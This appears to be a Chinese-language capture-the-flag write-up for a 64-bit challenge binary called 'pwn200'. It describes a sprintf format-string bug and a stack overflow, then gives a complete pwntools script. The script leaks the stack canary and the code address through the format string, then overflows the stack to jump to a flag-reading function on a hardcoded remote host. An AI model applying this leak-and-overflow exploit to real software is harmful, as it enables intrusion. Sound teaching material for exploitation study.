
## Check
程序全开保护

## Vuln
有两处漏洞
1. sprintf格式化
2. 栈溢出

## exp
格式化只能一次，于是考虑溢出canary，然后利用栈溢出进行rop

### rop
由于所有保护全开，rop前需要先得到程序加载的地址，这里一并通过sprintf溢出

```Python
payload = '1'*0x8 + "_%26$llx_%30$llx_" + '\n'
leav_message(payload)
```

### code

```Python
from pwn import *
import time, sys

elf_name = "./pwn200"

#retmote args
remote_host = "54.222.255.223"
remote_port = 50002
context.clear(arch="amd64")
elf = ELF(elf_name)

io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(mindex):
    io.recvuntil("Leave a message\n")
    io.sendline(str(mindex))

def mLogin(content):
    mmenu(1)
    io.recvuntil("Name:")
    dlySend(content)

def get_file(f_name):
    mmenu(2)
    io.recvuntil("input the filename:")
    dlySend(f_name)

def leav_message(mmessg):
    mmenu(3)
    io.recvuntil("Input your msg:")
    dlySend(mmessg)

def s_exp():
    rd_flag_off = 0x626
    sfmt_n = sys.argv[1]
    mLogin("aa"+'\n')
    payload = '1'*0x8 + "_%26$llx_%30$llx_%" + sfmt_n + "$llx_" + '\n'
    leav_message(payload)
    io.recvuntil("1"*8+'_')
    data = io.recvuntil("_")[:-1]
    lk_canary = int(data, 16)
    log.info("canary data: "+hex(lk_canary))
    data = io.recvuntil("_")[:-1]
    lk_mainVuln = int(data, 16) - 0xE3
    log.info("main vuln addr: "+hex(lk_mainVuln))
    rd_flg_addr = lk_mainVuln - rd_flag_off
    log.info("rd flag addr: "+hex(rd_flg_addr))
    print io.recvuntil("\n")
    payload = 'a'*0x28
    payload += p64(lk_canary)
    payload += p64(rd_flg_addr) * 6
    payload += '\n'
    mLogin(payload)
    print io.recvall()

if __name__ == "__main__":
    s_exp()
    #pause()
```
